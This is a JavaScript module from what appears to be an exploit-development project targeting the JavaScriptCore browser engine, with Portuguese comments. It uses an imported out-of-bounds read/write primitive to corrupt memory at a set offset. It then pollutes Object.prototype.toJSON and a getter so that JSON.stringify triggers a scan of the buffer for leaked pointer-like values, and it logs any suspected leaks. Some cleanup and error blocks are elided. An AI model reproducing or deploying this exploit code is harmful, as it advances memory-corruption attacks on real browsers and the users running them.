// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSnoopNoZero";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, snoop_data: [] };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const WIDE_SNOOP_START_OFFSET = 0x0;
const WIDE_SNOOP_END_OFFSET = 0x100; // Sondar os primeiros 256 bytes

class CheckpointObjectForSnoopNoZero {
    constructor(id) {
        this.id = `SnoopNoZeroCheckpoint-${id}`;
    }
}

export function toJSON_TriggerSnoopNoZeroGetter() {
    const FNAME_toJSON = "toJSON_TriggerSnoopNoZeroGetter";
    if (this instanceof CheckpointObjectForSnoopNoZero) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeSnoopNoZeroInGetter"; // Nome interno
    logS3(`--- Iniciando Teste de Sondagem Ampla (Sem Zerar) no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, snoop_data: [] };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_read_absolute || !oob_write_absolute) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB ou primitivas R/W.", error: "OOB env/primitives not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // NÃO vamos zerar a janela de sondagem desta vez.

        // 1. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} com ${CORRUPTION_VALUE.toString(true)} completada.`, "info", FNAME_TEST);

        // 2. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForSnoopNoZero(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForSnoopNoZero.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForSnoopNoZero.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() { // Getter SÍNCRONO
                getter_called_flag = true;
                const FNAME_GETTER = "SnoopNoZero_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Sondando memória (sem zerar previamente)...`, "vuln", FNAME_GETTER);
                
                let snoop_results_temp = [];
                let interesting_values_found = 0;

                try {
                    if (!oob_read_absolute) { /* ... erro ... */ return 0xDEADDEAD; }

                    logS3(`DENTRO DO GETTER: Sondando de ${toHex(WIDE_SNOOP_START_OFFSET)} a ${toHex(WIDE_SNOOP_END_OFFSET)}...`, "info", FNAME_GETTER);
                    
                    for (let offset = WIDE_SNOOP_START_OFFSET; offset < WIDE_SNOOP_END_OFFSET; offset += 8) { // Ler de 8 em 8 bytes
                        if (offset < 0 || (offset + 8) > oob_array_buffer_real.byteLength) {
                            continue;
                        }
                        try {
                            const value_read = oob_read_absolute(offset, 8); // Ler 8 bytes
                            const value_is_corruption_val = (offset === CORRUPTION_OFFSET && value_read instanceof AdvancedInt64 && value_read.equals(CORRUPTION_VALUE));
                            
                            // Logar apenas valores não-zero (ou o valor da corrupção)
                            // Se o buffer não foi zerado, esperamos ver o conteúdo inicial ou lixo.
                            if (!value_read.equals(AdvancedInt64.Zero) || value_is_corruption_val) {
                                const value_str = value_read instanceof AdvancedInt64 ? value_read.toString(true) : toHex(value_read, 64);
                                snoop_results_temp.push({offset: toHex(offset), value: value_str});
                                logS3(`SNOOP_NOZERO: oob_data[${toHex(offset)}] = ${value_str}`, "leak", FNAME_GETTER);
                                if (!value_is_corruption_val && !value_read.equals(AdvancedInt64.Zero)) {
                                    // Aplicar heurística de ponteiro aqui
                                    if (value_read instanceof AdvancedInt64 && (value_read.high() > 0x00010000 || value_read.high() < 0) && value_read.high() !== 0xFFFFFFFF) {
                                        logS3(`SNOOP_NOZERO: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
                                        interesting_values_found++;
                                    } else if (! (value_read instanceof AdvancedInt64) && value_read > 0x100000000){ // number
                                         logS3(`SNOOP_NOZERO: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
                                        interesting_values_found++;
                                    }
                                }
                            }
                        } catch (e_read) {
                            logS3(`SNOOP_NOZERO: Erro ao ler oob_data[${toHex(offset)}]: ${e_read.message}`, "error", FNAME_GETTER);
                            snoop_results_temp.push({offset: toHex(offset), value: `ERRO_LEITURA: ${e_read.message}`});
                        }
                    }
                    current_test_results.snoop_data = snoop_results_temp;
                    if (interesting_values_found > 0) {
                        current_test_results.success = true;
                        current_test_results.message = `Sondagem (sem zerar) encontrou ${interesting_values_found} valor(es) suspeito(s).`;
                    } else {
                        current_test_results.message = "Sondagem (sem zerar) completada, nenhum vazamento óbvio ou valor inesperado encontrado.";
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO GERAL durante sondagem: ${e.message}`, "error", FNAME_GETTER);
                    current_test_results.error = String(e);
                    current_test_results.message = `Erro geral na sondagem: ${e.message}`;
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerSnoopNoZeroGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) { /* ... erro principal ... */ }
    finally { /* ... limpeza ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO SONDAGEM (SEM ZERAR): ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO SONDAGEM (SEM ZERAR): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        logS3("Dados Sondados (Offset: Valor) - Apenas não-zero ou valor da corrupção:", "info", FNAME_TEST);
        current_test_results.snoop_data.forEach(item => {
            logS3(`  ${item.offset}: ${item.value}`, "info", FNAME_TEST);
        });
    } else { /* ... getter não chamado ... */ }

    clearOOBEnvironment();
    logS3(`--- Teste de Sondagem Ampla (Sem Zerar) Concluído ---`, "test", FNAME_TEST);
}
